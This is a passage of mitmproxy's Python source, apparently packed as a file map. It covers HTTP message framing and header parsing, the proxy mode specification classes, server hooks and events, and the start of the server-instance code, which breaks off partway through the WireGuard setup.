headers[\"transfer-encoding\"]\n        if not te.isascii():\n            # guard against .lower() transforming non-ascii to ascii\n            raise ValueError(f\"Invalid transfer encoding: {te!r}\")\n        te = te.lower().strip(\"\\t \")\n        te = re.sub(r\"[\\t ]*,[\\t ]*\", \",\", te)\n        if te in (\n            \"chunked\",\n            \"compress,chunked\",\n            \"deflate,chunked\",\n            \"gzip,chunked\",\n        ):\n            return None\n        elif te in (\n            \"compress\",\n            \"deflate\",\n            \"gzip\",\n            \"identity\",\n        ):\n            if response:\n                return -1\n            else:\n                raise ValueError(\n                    f\"Invalid request transfer encoding, message body cannot be determined reliably.\"\n                )\n        else:\n            raise ValueError(\n                f\"Unknown transfer encoding: {headers['transfer-encoding']!r}\"\n            )\n\n    #    4.  If a message is received without Transfer-Encoding and with\n    #        either multiple Content-Length header fields having differing\n    #        field-values or a single Content-Length header field having an\n    #        invalid value, then the message framing is invalid and the\n    #        recipient MUST treat it as an unrecoverable error.  If this is a\n    #        request message, the server MUST respond with a 400 (Bad Request)\n    #        status code and then close the connection.  If this is a response\n    #        message received by a proxy, the proxy MUST close the connection\n    #        to the server, discard the received response, and send a 502 (Bad\n    #        Gateway) response to the client.  If this is a response message\n    #        received by a user agent, the user agent MUST close the\n    #        connection to the server and discard the received response.\n    #\n    #    5.  If a valid Content-Length header field is present without\n    #        Transfer-Encoding, its decimal value defines the expected message\n    #        body length in octets.  If the sender closes the connection or\n    #        the recipient times out before the indicated number of octets are\n    #        received, the recipient MUST consider the message to be\n    #        incomplete and close the connection.\n    if \"content-length\" in headers:\n        sizes = headers.get_all(\"content-length\")\n        different_content_length_headers = any(x != sizes[0] for x in sizes)\n        if different_content_length_headers:\n            raise ValueError(f\"Conflicting Content-Length headers: {sizes!r}\")\n        try:\n            size = int(sizes[0])\n        except ValueError:\n            raise ValueError(f\"Invalid Content-Length header: {sizes[0]!r}\")\n        if size < 0:\n            raise ValueError(f\"Negative Content-Length header: {sizes[0]!r}\")\n        return size\n\n    #    6.  If this is a request message and none of the above are true, then\n    #        the message body length is zero (no message body is present).\n    if not response:\n        return 0\n\n    #    7.  Otherwise, this is a response message without a declared message\n    #        body length, so the message body length is determined by the\n    #        number of octets received prior to the server closing the\n    #        connection.\n    return -1\n\n\ndef raise_if_http_version_unknown(http_version: bytes) -> None:\n    if not re.match(rb\"^HTTP/\\d\\.\\d$\", http_version):\n        raise ValueError(f\"Unknown HTTP version: {http_version!r}\")\n\n\ndef _read_request_line(\n    line: bytes,\n) -> tuple[str, int, bytes, bytes, bytes, bytes, bytes]:\n    try:\n        method, target, http_version = line.split()\n        port: int | None\n\n        if target == b\"*\" or target.startswith(b\"/\"):\n            scheme, authority, path = b\"\", b\"\", target\n            host, port = \"\", 0\n        elif method == b\"CONNECT\":\n            scheme, authority, path = b\"\", target, b\"\"\n            host, port = url.parse_authority(authority, check=True)\n            if not port:\n                raise ValueError\n        else:\n            scheme, rest = target.split(b\"://\", maxsplit=1)\n            authority, _, path_ = rest.partition(b\"/\")\n            path = b\"/\" + path_\n            host, port = url.parse_authority(authority, check=True)\n            port = port or url.default_port(scheme)\n            if not port:\n                raise ValueError\n            # TODO: we can probably get rid of this check?\n            url.parse(target)\n\n        raise_if_http_version_unknown(http_version)\n    except ValueError as e:\n        raise ValueError(f\"Bad HTTP request line: {line!r}\") from e\n\n    return host, port, method, scheme, authority, path, http_version\n\n\ndef _read_response_line(line: bytes) -> tuple[bytes, int, bytes]:\n    try:\n        parts = line.split(None, 2)\n        if len(parts) == 2:  # handle missing message gracefully\n            parts.append(b\"\")\n\n        http_version, status_code_str, reason = parts\n        status_code = int(status_code_str)\n        raise_if_http_version_unknown(http_version)\n    except ValueError as e:\n        raise ValueError(f\"Bad HTTP response line: {line!r}\") from e\n\n    return http_version, status_code, reason\n\n\ndef _read_headers(lines: Iterable[bytes]) -> Headers:\n    \"\"\"\n    Read a set of headers.\n    Stop once a blank line is reached.\n\n    Returns:\n        A headers object\n\n    Raises:\n        exceptions.HttpSyntaxException\n    \"\"\"\n    ret: list[tuple[bytes, bytes]] = []\n    for line in lines:\n        if line[0] in b\" \\t\":\n            if not ret:\n                raise ValueError(\"Invalid headers\")\n            # continued header\n            ret[-1] = (ret[-1][0], ret[-1][1] + b\"\\r\\n \" + line.strip())\n        else:\n            try:\n                name, value = line.split(b\":\", 1)\n                value = value.strip()\n                if not name:\n                    raise ValueError()\n                ret.append((name, value))\n            except ValueError:\n                raise ValueError(f\"Invalid header line: {line!r}\")\n    return Headers(ret)\n\n\ndef read_request_head(lines: list[bytes]) -> Request:\n    \"\"\"\n    Parse an HTTP request head (request line + headers) from an iterable of lines\n\n    Args:\n        lines: The input lines\n\n    Returns:\n        The HTTP request object (without body)\n\n    Raises:\n        ValueError: The input is malformed.\n    \"\"\"\n    host, port, method, scheme, authority, path, http_version = _read_request_line(\n        lines[0]\n    )\n    headers = _read_headers(lines[1:])\n\n    return Request(\n        host=host,\n        port=port,\n        method=method,\n        scheme=scheme,\n        authority=authority,\n        path=path,\n        http_version=http_version,\n        headers=headers,\n        content=None,\n        trailers=None,\n        timestamp_start=time.time(),\n        timestamp_end=None,\n    )\n\n\ndef read_response_head(lines: list[bytes]) -> Response:\n    \"\"\"\n    Parse an HTTP response head (response line + headers) from an iterable of lines\n\n    Args:\n        lines: The input lines\n\n    Returns:\n        The HTTP response object (without body)\n\n    Raises:\n        ValueError: The input is malformed.\n    \"\"\"\n    http_version, status_code, reason = _read_response_line(lines[0])\n    headers = _read_headers(lines[1:])\n\n    return Response(\n        http_version=http_version,\n        status_code=status_code,\n        reason=reason,\n        headers=headers,\n        content=None,\n        trailers=None,\n        timestamp_start=time.time(),\n        timestamp_end=None,\n    )\n", "mitmproxy/proxy/mode_specs.py": "\"\"\"\nThis module is responsible for parsing proxy mode specifications such as\n`\"regular\"`, `\"reverse:https://example.com\"`, or `\"socks5@1234\"`. The general syntax is\n\n    mode [: mode_configuration] [@ [listen_addr:]listen_port]\n\nFor a full example, consider `reverse:https://example.com@127.0.0.1:443`.\nThis would spawn a reverse proxy on port 443 bound to localhost.\nThe mode is `reverse`, and the mode data is `https://example.com`.\nExamples:\n\n    mode = ProxyMode.parse(\"regular@1234\")\n    assert mode.listen_port == 1234\n    assert isinstance(mode, RegularMode)\n\n    ProxyMode.parse(\"reverse:example.com@invalid-port\")  # ValueError\n\n    RegularMode.parse(\"regular\")  # ok\n    RegularMode.parse(\"socks5\")  # ValueError\n\n\"\"\"\n\nfrom __future__ import annotations\n\nimport dataclasses\nimport sys\nfrom abc import ABCMeta\nfrom abc import abstractmethod\nfrom dataclasses import dataclass\nfrom functools import cache\nfrom typing import ClassVar\nfrom typing import Literal\n\nimport mitmproxy_rs\n\nfrom mitmproxy.coretypes.serializable import Serializable\nfrom mitmproxy.net import server_spec\n\nif sys.version_info < (3, 11):\n    from typing_extensions import Self  # pragma: no cover\nelse:\n    from typing import Self\n\n\n@dataclass(frozen=True)  # type: ignore\nclass ProxyMode(Serializable, metaclass=ABCMeta):\n    \"\"\"\n    Parsed representation of a proxy mode spec. Subclassed for each specific mode,\n    which then does its own data validation.\n    \"\"\"\n\n    full_spec: str\n    \"\"\"The full proxy mode spec as entered by the user.\"\"\"\n    data: str\n    \"\"\"The (raw) mode data, i.e. the part after the mode name.\"\"\"\n    custom_listen_host: str | None\n    \"\"\"A custom listen host, if specified in the spec.\"\"\"\n    custom_listen_port: int | None\n    \"\"\"A custom listen port, if specified in the spec.\"\"\"\n\n    type_name: ClassVar[\n        str\n    ]  # automatically derived from the class name in __init_subclass__\n    \"\"\"The unique name for this proxy mode, e.g. \"regular\" or \"reverse\".\"\"\"\n    __types: ClassVar[dict[str, type[ProxyMode]]] = {}\n\n    def __init_subclass__(cls, **kwargs):\n        cls.type_name = cls.__name__.removesuffix(\"Mode\").lower()\n        assert cls.type_name not in ProxyMode.__types\n        ProxyMode.__types[cls.type_name] = cls\n\n    def __repr__(self):\n        return f\"ProxyMode.parse({self.full_spec!r})\"\n\n    @abstractmethod\n    def __post_init__(self) -> None:\n        \"\"\"Validation of data happens here.\"\"\"\n\n    @property\n    @abstractmethod\n    def description(self) -> str:\n        \"\"\"The mode description that will be used in server logs and UI.\"\"\"\n\n    @property\n    def default_port(self) -> int:\n        \"\"\"\n        Default listen port of servers for this mode, see `ProxyMode.listen_port()`.\n        \"\"\"\n        return 8080\n\n    @property\n    @abstractmethod\n    def transport_protocol(self) -> Literal[\"tcp\", \"udp\", \"both\"] | None:\n        \"\"\"The transport protocol used by this mode's server.\"\"\"\n\n    @classmethod\n    @cache\n    def parse(cls, spec: str) -> Self:\n        \"\"\"\n        Parse a proxy mode specification and return the corresponding `ProxyMode` instance.\n        \"\"\"\n        head, _, listen_at = spec.rpartition(\"@\")\n        if not head:\n            head = listen_at\n            listen_at = \"\"\n\n        mode, _, data = head.partition(\":\")\n\n        if listen_at:\n            if \":\" in listen_at:\n                host, _, port_str = listen_at.rpartition(\":\")\n            else:\n                host = None\n                port_str = listen_at\n            try:\n                port = int(port_str)\n                if port < 0 or 65535 < port:\n                    raise ValueError\n            except ValueError:\n                raise ValueError(f\"invalid port: {port_str}\")\n        else:\n            host = None\n            port = None\n\n        try:\n            mode_cls = ProxyMode.__types[mode.lower()]\n        except KeyError:\n            raise ValueError(f\"unknown mode\")\n\n        if not issubclass(mode_cls, cls):\n            raise ValueError(f\"{mode!r} is not a spec for a {cls.type_name} mode\")\n\n        return mode_cls(\n            full_spec=spec, data=data, custom_listen_host=host, custom_listen_port=port\n        )\n\n    def listen_host(self, default: str | None = None) -> str:\n        \"\"\"\n        Return the address a server for this mode should listen on. This can be either directly\n        specified in the spec or taken from a user-configured global default (`options.listen_host`).\n        By default, return an empty string to listen on all hosts.\n        \"\"\"\n        if self.custom_listen_host is not None:\n            return self.custom_listen_host\n        elif default is not None:\n            return default\n        else:\n            return \"\"\n\n    def listen_port(self, default: int | None = None) -> int:\n        \"\"\"\n        Return the port a server for this mode should listen on. This can be either directly\n        specified in the spec, taken from a user-configured global default (`options.listen_port`),\n        or from `ProxyMode.default_port`.\n        \"\"\"\n        if self.custom_listen_port is not None:\n            return self.custom_listen_port\n        elif default is not None:\n            return default\n        else:\n            return self.default_port\n\n    @classmethod\n    def from_state(cls, state):\n        return ProxyMode.parse(state)\n\n    def get_state(self):\n        return self.full_spec\n\n    def set_state(self, state):\n        if state != self.full_spec:\n            raise dataclasses.FrozenInstanceError(\"Proxy modes are immutable.\")\n\n\nTCP: Literal[\"tcp\", \"udp\", \"both\"] = \"tcp\"\nUDP: Literal[\"tcp\", \"udp\", \"both\"] = \"udp\"\nBOTH: Literal[\"tcp\", \"udp\", \"both\"] = \"both\"\n\n\ndef _check_empty(data):\n    if data:\n        raise ValueError(\"mode takes no arguments\")\n\n\nclass RegularMode(ProxyMode):\n    \"\"\"A regular HTTP(S) proxy that is interfaced with `HTTP CONNECT` calls (or absolute-form HTTP requests).\"\"\"\n\n    description = \"HTTP(S) proxy\"\n    transport_protocol = TCP\n\n    def __post_init__(self) -> None:\n        _check_empty(self.data)\n\n\nclass TransparentMode(ProxyMode):\n    \"\"\"A transparent proxy, see https://docs.mitmproxy.org/dev/howto-transparent/\"\"\"\n\n    description = \"Transparent Proxy\"\n    transport_protocol = TCP\n\n    def __post_init__(self) -> None:\n        _check_empty(self.data)\n\n\nclass UpstreamMode(ProxyMode):\n    \"\"\"A regular HTTP(S) proxy, but all connections are forwarded to a second upstream HTTP(S) proxy.\"\"\"\n\n    description = \"HTTP(S) proxy (upstream mode)\"\n    transport_protocol = TCP\n    scheme: Literal[\"http\", \"https\"]\n    address: tuple[str, int]\n\n    # noinspection PyDataclass\n    def __post_init__(self) -> None:\n        scheme, self.address = server_spec.parse(self.data, default_scheme=\"http\")\n        if scheme != \"http\" and scheme != \"https\":\n            raise ValueError(\"invalid upstream proxy scheme\")\n        self.scheme = scheme\n\n\nclass ReverseMode(ProxyMode):\n    \"\"\"A reverse proxy. This acts like a normal server, but redirects all requests to a fixed target.\"\"\"\n\n    description = \"reverse proxy\"\n    transport_protocol = TCP\n    scheme: Literal[\n        \"http\", \"https\", \"http3\", \"tls\", \"dtls\", \"tcp\", \"udp\", \"dns\", \"quic\"\n    ]\n    address: tuple[str, int]\n\n    # noinspection PyDataclass\n    def __post_init__(self) -> None:\n        self.scheme, self.address = server_spec.parse(self.data, default_scheme=\"https\")\n        if self.scheme in (\"http3\", \"dtls\", \"udp\", \"quic\"):\n            self.transport_protocol = UDP\n        elif self.scheme == \"dns\":\n            self.transport_protocol = BOTH\n        self.description = f\"{self.description} to {self.data}\"\n\n    @property\n    def default_port(self) -> int:\n        if self.scheme == \"dns\":\n            return 53\n        return super().default_port\n\n\nclass Socks5Mode(ProxyMode):\n    \"\"\"A SOCKSv5 proxy.\"\"\"\n\n    description = \"SOCKS v5 proxy\"\n    default_port = 1080\n    transport_protocol = TCP\n\n    def __post_init__(self) -> None:\n        _check_empty(self.data)\n\n\nclass DnsMode(ProxyMode):\n    \"\"\"A DNS server.\"\"\"\n\n    description = \"DNS server\"\n    default_port = 53\n    transport_protocol = BOTH\n\n    def __post_init__(self) -> None:\n        _check_empty(self.data)\n\n\n# class Http3Mode(ProxyMode):\n#     \"\"\"\n#     A regular HTTP3 proxy that is interfaced with absolute-form HTTP requests.\n#     (This class will be merged into `RegularMode` once the UDP implementation is deemed stable enough.)\n#     \"\"\"\n#\n#     description = \"HTTP3 proxy\"\n#     transport_protocol = UDP\n#\n#     def __post_init__(self) -> None:\n#         _check_empty(self.data)\n\n\nclass WireGuardMode(ProxyMode):\n    \"\"\"Proxy Server based on WireGuard\"\"\"\n\n    description = \"WireGuard server\"\n    default_port = 51820\n    transport_protocol = UDP\n\n    def __post_init__(self) -> None:\n        pass\n\n\nclass LocalMode(ProxyMode):\n    \"\"\"OS-level transparent proxy.\"\"\"\n\n    description = \"Local redirector\"\n    transport_protocol = None\n\n    def __post_init__(self) -> None:\n        # should not raise\n        mitmproxy_rs.LocalRedirector.describe_spec(self.data)\n\n\nclass OsProxyMode(ProxyMode):  # pragma: no cover\n    \"\"\"Deprecated alias for LocalMode\"\"\"\n\n    description = \"Deprecated alias for LocalMode\"\n    transport_protocol = None\n\n    def __post_init__(self) -> None:\n        raise ValueError(\n            \"osproxy mode has been renamed to local mode. Thanks for trying our experimental features!\"\n        )\n", "mitmproxy/proxy/server_hooks.py": "from dataclasses import dataclass\n\nfrom . import commands\nfrom mitmproxy import connection\n\n\n@dataclass\nclass ClientConnectedHook(commands.StartHook):\n    \"\"\"\n    A client has connected to mitmproxy. Note that a connection can\n    correspond to multiple HTTP requests.\n\n    Setting client.error kills the connection.\n    \"\"\"\n\n    client: connection.Client\n\n\n@dataclass\nclass ClientDisconnectedHook(commands.StartHook):\n    \"\"\"\n    A client connection has been closed (either by us or the client).\n    \"\"\"\n\n    client: connection.Client\n\n\n@dataclass\nclass ServerConnectionHookData:\n    \"\"\"Event data for server connection event hooks.\"\"\"\n\n    server: connection.Server\n    \"\"\"The server connection this hook is about.\"\"\"\n    client: connection.Client\n    \"\"\"The client on the other end.\"\"\"\n\n\n@dataclass\nclass ServerConnectHook(commands.StartHook):\n    \"\"\"\n    Mitmproxy is about to connect to a server.\n    Note that a connection can correspond to multiple requests.\n\n    Setting data.server.error kills the connection.\n    \"\"\"\n\n    data: ServerConnectionHookData\n\n\n@dataclass\nclass ServerConnectedHook(commands.StartHook):\n    \"\"\"\n    Mitmproxy has connected to a server.\n    \"\"\"\n\n    data: ServerConnectionHookData\n\n\n@dataclass\nclass ServerDisconnectedHook(commands.StartHook):\n    \"\"\"\n    A server connection has been closed (either by us or the server).\n    \"\"\"\n\n    data: ServerConnectionHookData\n\n\n@dataclass\nclass ServerConnectErrorHook(commands.StartHook):\n    \"\"\"\n    Mitmproxy failed to connect to a server.\n\n    Every server connection will receive either a server_connected or a server_connect_error event, but not both.\n    \"\"\"\n\n    data: ServerConnectionHookData\n", "mitmproxy/proxy/events.py": "\"\"\"\nWhen IO actions occur at the proxy server, they are passed down to layers as events.\nEvents represent the only way for layers to receive new data from sockets.\nThe counterpart to events are commands.\n\"\"\"\n\nimport typing\nimport warnings\nfrom dataclasses import dataclass\nfrom dataclasses import is_dataclass\nfrom typing import Any\nfrom typing import Generic\nfrom typing import TypeVar\n\nfrom mitmproxy import flow\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.proxy import commands\n\n\nclass Event:\n    \"\"\"\n    Base class for all events.\n    \"\"\"\n\n    def __repr__(self):\n        return f\"{type(self).__name__}({repr(self.__dict__)})\"\n\n\nclass Start(Event):\n    \"\"\"\n    Every layer initially receives a start event.\n    This is useful to emit events on startup.\n    \"\"\"\n\n\n@dataclass\nclass ConnectionEvent(Event):\n    \"\"\"\n    All events involving connection IO.\n    \"\"\"\n\n    connection: Connection\n\n\n@dataclass\nclass DataReceived(ConnectionEvent):\n    \"\"\"\n    Remote has sent some data.\n    \"\"\"\n\n    data: bytes\n\n    def __repr__(self):\n        target = type(self.connection).__name__.lower()\n        return f\"DataReceived({target}, {self.data!r})\"\n\n\nclass ConnectionClosed(ConnectionEvent):\n    \"\"\"\n    Remote has closed a connection.\n    \"\"\"\n\n\nclass CommandCompleted(Event):\n    \"\"\"\n    Emitted when a command has been finished, e.g.\n    when the master has replied or when we have established a server connection.\n    \"\"\"\n\n    command: commands.Command\n    reply: Any\n\n    def __new__(cls, *args, **kwargs):\n        if cls is CommandCompleted:\n            raise TypeError(\"CommandCompleted may not be instantiated directly.\")\n        assert is_dataclass(cls)\n        return super().__new__(cls)\n\n    def __init_subclass__(cls, **kwargs):\n        command_cls = typing.get_type_hints(cls).get(\"command\", None)\n        valid_command_subclass = (\n            isinstance(command_cls, type)\n            and issubclass(command_cls, commands.Command)\n            and command_cls is not commands.Command\n        )\n        if not valid_command_subclass:\n            warnings.warn(\n                f\"{cls} needs a properly annotated command attribute.\",\n                RuntimeWarning,\n            )\n        if command_cls in command_reply_subclasses:\n            other = command_reply_subclasses[command_cls]\n            warnings.warn(\n                f\"Two conflicting subclasses for {command_cls}: {cls} and {other}\",\n                RuntimeWarning,\n            )\n        command_reply_subclasses[command_cls] = cls\n\n    def __repr__(self):\n        return f\"Reply({repr(self.command)}, {repr(self.reply)})\"\n\n\ncommand_reply_subclasses: dict[commands.Command, type[CommandCompleted]] = {}\n\n\n@dataclass(repr=False)\nclass OpenConnectionCompleted(CommandCompleted):\n    command: commands.OpenConnection\n    reply: str | None\n    \"\"\"error message\"\"\"\n\n\n@dataclass(repr=False)\nclass HookCompleted(CommandCompleted):\n    command: commands.StartHook\n    reply: None = None\n\n\nT = TypeVar(\"T\")\n\n\n@dataclass\nclass MessageInjected(Event, Generic[T]):\n    \"\"\"\n    The user has injected a custom WebSocket/TCP/... message.\n    \"\"\"\n\n    flow: flow.Flow\n    message: T\n\n\n@dataclass\nclass Wakeup(CommandCompleted):\n    \"\"\"\n    Event sent to layers that requested a wakeup using RequestWakeup.\n    \"\"\"\n\n    command: commands.RequestWakeup\n", "mitmproxy/proxy/mode_servers.py": "\"\"\"\nThis module defines \"server instances\", which manage\nthe TCP/UDP servers spawned by mitmproxy as specified by the proxy mode.\n\nExample:\n\n    mode = ProxyMode.parse(\"reverse:https://example.com\")\n    inst = ServerInstance.make(mode, manager_that_handles_callbacks)\n    await inst.start()\n    # TCP server is running now.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport asyncio\nimport errno\nimport json\nimport logging\nimport os\nimport socket\nimport sys\nimport textwrap\nimport typing\nfrom abc import ABCMeta\nfrom abc import abstractmethod\nfrom contextlib import contextmanager\nfrom pathlib import Path\nfrom typing import cast\nfrom typing import ClassVar\nfrom typing import Generic\nfrom typing import get_args\nfrom typing import TYPE_CHECKING\nfrom typing import TypeVar\n\nimport mitmproxy_rs\n\nfrom mitmproxy import ctx\nfrom mitmproxy import flow\nfrom mitmproxy import platform\nfrom mitmproxy.connection import Address\nfrom mitmproxy.net import local_ip\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import layers\nfrom mitmproxy.proxy import mode_specs\nfrom mitmproxy.proxy import server\nfrom mitmproxy.proxy.context import Context\nfrom mitmproxy.proxy.layer import Layer\nfrom mitmproxy.utils import human\n\nif sys.version_info < (3, 11):\n    from typing_extensions import Self  # pragma: no cover\nelse:\n    from typing import Self\n\nif TYPE_CHECKING:\n    from mitmproxy.master import Master\n\nlogger = logging.getLogger(__name__)\n\n\nclass ProxyConnectionHandler(server.LiveConnectionHandler):\n    master: Master\n\n    def __init__(self, master, r, w, options, mode):\n        self.master = master\n        super().__init__(r, w, options, mode)\n        self.log_prefix = f\"{human.format_address(self.client.peername)}: \"\n\n    async def handle_hook(self, hook: commands.StartHook) -> None:\n        with self.timeout_watchdog.disarm():\n            # We currently only support single-argument hooks.\n            (data,) = hook.args()\n            await self.master.addons.handle_lifecycle(hook)\n            if isinstance(data, flow.Flow):\n                await data.wait_for_resume()  # pragma: no cover\n\n\nM = TypeVar(\"M\", bound=mode_specs.ProxyMode)\n\n\nclass ServerManager(typing.Protocol):\n    # temporary workaround: for UDP, we use the 4-tuple because we don't have a uuid.\n    connections: dict[tuple | str, ProxyConnectionHandler]\n\n    @contextmanager\n    def register_connection(\n        self, connection_id: tuple | str, handler: ProxyConnectionHandler\n    ): ...  # pragma: no cover\n\n\nclass ServerInstance(Generic[M], metaclass=ABCMeta):\n    __modes: ClassVar[dict[str, type[ServerInstance]]] = {}\n\n    last_exception: Exception | None = None\n\n    def __init__(self, mode: M, manager: ServerManager):\n        self.mode: M = mode\n        self.manager: ServerManager = manager\n\n    def __init_subclass__(cls, **kwargs):\n        \"\"\"Register all subclasses so that make() finds them.\"\"\"\n        # extract mode from Generic[Mode].\n        mode = get_args(cls.__orig_bases__[0])[0]  # type: ignore\n        if not isinstance(mode, TypeVar):\n            assert issubclass(mode, mode_specs.ProxyMode)\n            assert mode.type_name not in ServerInstance.__modes\n            ServerInstance.__modes[mode.type_name] = cls\n\n    @classmethod\n    def make(\n        cls,\n        mode: mode_specs.ProxyMode | str,\n        manager: ServerManager,\n    ) -> Self:\n        if isinstance(mode, str):\n            mode = mode_specs.ProxyMode.parse(mode)\n        inst = ServerInstance.__modes[mode.type_name](mode, manager)\n\n        if not isinstance(inst, cls):\n            raise ValueError(f\"{mode!r} is not a spec for a {cls.__name__} server.\")\n\n        return inst\n\n    @property\n    @abstractmethod\n    def is_running(self) -> bool:\n        pass\n\n    async def start(self) -> None:\n        try:\n            await self._start()\n        except Exception as e:\n            self.last_exception = e\n            raise\n        else:\n            self.last_exception = None\n        if self.listen_addrs:\n            addrs = \" and \".join({human.format_address(a) for a in self.listen_addrs})\n            logger.info(f\"{self.mode.description} listening at {addrs}.\")\n        else:\n            logger.info(f\"{self.mode.description} started.\")\n\n    async def stop(self) -> None:\n        listen_addrs = self.listen_addrs\n        try:\n            await self._stop()\n        except Exception as e:\n            self.last_exception = e\n            raise\n        else:\n            self.last_exception = None\n        if listen_addrs:\n            addrs = \" and \".join({human.format_address(a) for a in listen_addrs})\n            logger.info(f\"{self.mode.description} at {addrs} stopped.\")\n        else:\n            logger.info(f\"{self.mode.description} stopped.\")\n\n    @abstractmethod\n    async def _start(self) -> None:\n        pass\n\n    @abstractmethod\n    async def _stop(self) -> None:\n        pass\n\n    @property\n    @abstractmethod\n    def listen_addrs(self) -> tuple[Address, ...]:\n        pass\n\n    @abstractmethod\n    def make_top_layer(self, context: Context) -> Layer:\n        pass\n\n    def to_json(self) -> dict:\n        return {\n            \"type\": self.mode.type_name,\n            \"description\": self.mode.description,\n            \"full_spec\": self.mode.full_spec,\n            \"is_running\": self.is_running,\n            \"last_exception\": str(self.last_exception) if self.last_exception else None,\n            \"listen_addrs\": self.listen_addrs,\n        }\n\n    async def handle_stream(\n        self,\n        reader: asyncio.StreamReader | mitmproxy_rs.Stream,\n        writer: asyncio.StreamWriter | mitmproxy_rs.Stream,\n    ) -> None:\n        handler = ProxyConnectionHandler(\n            ctx.master, reader, writer, ctx.options, self.mode\n        )\n        handler.layer = self.make_top_layer(handler.layer.context)\n        if isinstance(self.mode, mode_specs.TransparentMode):\n            assert isinstance(writer, asyncio.StreamWriter)\n            s = cast(socket.socket, writer.get_extra_info(\"socket\"))\n            try:\n                assert platform.original_addr\n                original_dst = platform.original_addr(s)\n            except Exception as e:\n                logger.error(f\"Transparent mode failure: {e!r}\")\n                writer.close()\n                return\n            else:\n                handler.layer.context.client.sockname = original_dst\n                handler.layer.context.server.address = original_dst\n        elif isinstance(\n            self.mode, (mode_specs.WireGuardMode, mode_specs.LocalMode)\n        ):  # pragma: no cover on platforms without wg-test-client\n            handler.layer.context.server.address = writer.get_extra_info(\n                \"remote_endpoint\", handler.layer.context.client.sockname\n            )\n\n        with self.manager.register_connection(handler.layer.context.client.id, handler):\n            await handler.handle_client()\n\n    async def handle_udp_stream(self, stream: mitmproxy_rs.Stream) -> None:\n        await self.handle_stream(stream, stream)\n\n\nclass AsyncioServerInstance(ServerInstance[M], metaclass=ABCMeta):\n    _servers: list[asyncio.Server | mitmproxy_rs.UdpServer]\n\n    def __init__(self, *args, **kwargs) -> None:\n        self._servers = []\n        super().__init__(*args, **kwargs)\n\n    @property\n    def is_running(self) -> bool:\n        return bool(self._servers)\n\n    @property\n    def listen_addrs(self) -> tuple[Address, ...]:\n        addrs = []\n        for s in self._servers:\n            if isinstance(s, mitmproxy_rs.UdpServer):\n                addrs.append(s.getsockname())\n            else:\n                try:\n                    addrs.extend(sock.getsockname() for sock in s.sockets)\n                except OSError:  # pragma: no cover\n                    pass  # this can fail during shutdown, see https://github.com/mitmproxy/mitmproxy/issues/6529\n        return tuple(addrs)\n\n    async def _start(self) -> None:\n        assert not self._servers\n        host = self.mode.listen_host(ctx.options.listen_host)\n        port = self.mode.listen_port(ctx.options.listen_port)\n        try:\n            self._servers = await self.listen(host, port)\n        except OSError as e:\n            message = f\"{self.mode.description} failed to listen on {host or '*'}:{port} with {e}\"\n            if e.errno == errno.EADDRINUSE and self.mode.custom_listen_port is None:\n                assert (\n                    self.mode.custom_listen_host is None\n                )  # since [@ [listen_addr:]listen_port]\n                message += f\"\\nTry specifying a different port by using `--mode {self.mode.full_spec}@{port + 2}`.\"\n            raise OSError(e.errno, message, e.filename) from e\n\n    async def _stop(self) -> None:\n        assert self._servers\n        try:\n            for s in self._servers:\n                s.close()\n            # https://github.com/python/cpython/issues/104344\n            # await asyncio.gather(*[s.wait_closed() for s in self._servers])\n        finally:\n            # we always reset _server and ignore failures\n            self._servers = []\n\n    async def listen(\n        self, host: str, port: int\n    ) -> list[asyncio.Server | mitmproxy_rs.UdpServer]:\n        if self.mode.transport_protocol not in (\"tcp\", \"udp\", \"both\"):\n            raise AssertionError(self.mode.transport_protocol)\n\n        servers: list[asyncio.Server | mitmproxy_rs.UdpServer] = []\n        if self.mode.transport_protocol in (\"tcp\", \"both\"):\n            # workaround for https://github.com/python/cpython/issues/89856:\n            # We want both IPv4 and IPv6 sockets to bind to the same port.\n            # This may fail (https://github.com/mitmproxy/mitmproxy/pull/5542#issuecomment-1222803291),\n            # so we try to cover the 99% case and then give up and fall back to what asyncio does.\n            if port == 0:\n                try:\n                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                    s.bind((\"\", 0))\n                    port = s.getsockname()[1]\n                    s.close()\n                    servers.append(\n                        await asyncio.start_server(self.handle_stream, host, port)\n                    )\n                except Exception as e:\n                    logger.debug(\n                        f\"Failed to listen on a single port ({e!r}), falling back to default behavior.\"\n                    )\n                    port = 0\n                    servers.append(\n                        await asyncio.start_server(self.handle_stream, host, port)\n                    )\n            else:\n                servers.append(\n                    await asyncio.start_server(self.handle_stream, host, port)\n                )\n        if self.mode.transport_protocol in (\"udp\", \"both\"):\n            # we start two servers for dual-stack support.\n            # On Linux, this would also be achievable by toggling IPV6_V6ONLY off, but this here works cross-platform.\n            if host == \"\":\n                ipv4 = await mitmproxy_rs.start_udp_server(\n                    \"0.0.0.0\",\n                    port,\n                    self.handle_udp_stream,\n                )\n                servers.append(ipv4)\n                try:\n                    ipv6 = await mitmproxy_rs.start_udp_server(\n                        \"::\",\n                        ipv4.getsockname()[1],\n                        self.handle_udp_stream,\n                    )\n                    servers.append(ipv6)  # pragma: no cover\n                except Exception:  # pragma: no cover\n                    logger.debug(\"Failed to listen on '::', listening on IPv4 only.\")\n            else:\n                servers.append(\n                    await mitmproxy_rs.start_udp_server(\n                        host,\n                        port,\n                        self.handle_udp_stream,\n                    )\n                )\n\n        return servers\n\n\nclass WireGuardServerInstance(ServerInstance[mode_specs.WireGuardMode]):\n    _server: mitmproxy_rs.WireGuardServer | None = None\n\n    server_key: str\n    client_key: str\n\n    def make_top_layer(\n        self, context: Context\n    ) -> Layer:  # pragma: no cover on platforms without wg-test-client\n        return layers.modes.TransparentProxy(context)\n\n    @property\n    def is_running(self) -> bool:\n        return self._server is not None\n\n    @property\n    def listen_addrs(self) -> tuple[Address, ...]:\n        if self._server:\n            return (self._server.getsockname(),)\n        else:\n            return tuple()\n\n    async def _start(self) -> None:\n        assert self._server is None\n        host = self.mode.listen_host(ctx.options.listen_host)\n        port = self.mode.listen_port(ctx.options.listen_port)\n\n        if self.mode.data:\n            conf_path = Path(self.mode.data).expanduser()\n        else:\n            conf_path = Path(ctx.options.confdir).expanduser() / \"wireguard.conf\"\n\n        if not conf_path.exists():\n            conf_path.parent.mkdir(parents=True, exist_ok=True)\n            conf_path.write_text(\n                json.dumps(\n                    {\n                        \"server_key\": mitmproxy_rs.genkey(),\n                        \"client_key\": mitmproxy_rs.genkey(),\n                    },\n                    indent=4,\n                )\n            )\n\n        try:\n            c = json.loads(conf_path.read_text())\n          